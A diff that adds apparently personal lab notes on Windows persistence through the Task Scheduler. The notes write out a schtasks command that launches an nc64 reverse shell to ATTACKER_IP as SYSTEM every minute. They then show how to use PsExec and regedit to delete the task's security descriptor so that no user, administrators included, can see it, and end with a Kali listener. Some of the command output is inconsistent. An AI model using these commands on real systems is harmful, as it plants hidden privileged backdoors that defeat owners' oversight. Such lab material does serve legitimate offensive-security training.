@@ -1,0 +1,61 @@
+Task Scheduler:
+We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them:
+
+Task Scheduler
+
+The most common way to schedule tasks is using the built-in Windows task scheduler. 
+Let's create a task that runs a reverse shell every single minute. 
+
+
+Command Prompt
+C:\> schtasks /create /sc minute /mo 1 /tn TASKNAME /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP PORT" /ru SYSTEM
+
+
+The previous command will create a "TASKNAME" task and execute an nc64 reverse shell back to the attacker. 
+The /sc and /mo options indicate that the task should be run every single minute. 
+The /ru option indicates that the task will run with SYSTEM privileges.
+
+To check if our task was successfully created, we can use the following command:
+
+Command Prompt
+C:\> schtasks /query /tn TASKNAME
+
+Folder: \
+TaskName                                 Next Run Time          Status
+======================================== ====================== ===============
+BackdoorTask                         77/77/2023 8:08:00 AM   Ready
+Making Our Task Invisible
+
+Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. 
+
+To further hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). 
+
+MAKE THE TASK INVISIBLE:
+    The security descriptor is simply an ACL that states which users have access to the scheduled task. 
+    If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. 
+    Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
+    The security descriptors of all scheduled tasks are stored in:
+
+        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\. 
+
+    You will find a registry key for every task, under which a value named "SD" contains the security descriptor. 
+    You can only erase the value if you hold SYSTEM privileges.
+
+    To hide our task, let's delete the SD value for the "TASKNAME" task we created before. 
+
+    To do so, we will use psexec (available in C:\tools) to open Regedit with SYSTEM privileges:
+
+    Command Prompt
+    C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
+    We will then delete the security descriptor for our task:
+
+Task Scheduler SD
+
+If we try to query our service again, the system will tell us there is no such task:
+
+Command Prompt
+C:\> schtasks /query /tn TASKNAME ERROR: The system cannot find the file specified.
+If we start an nc listener in our attacker's machine, we should get a shell back after a minute:
+
+Kali
+kali$ nc -lvp 4449
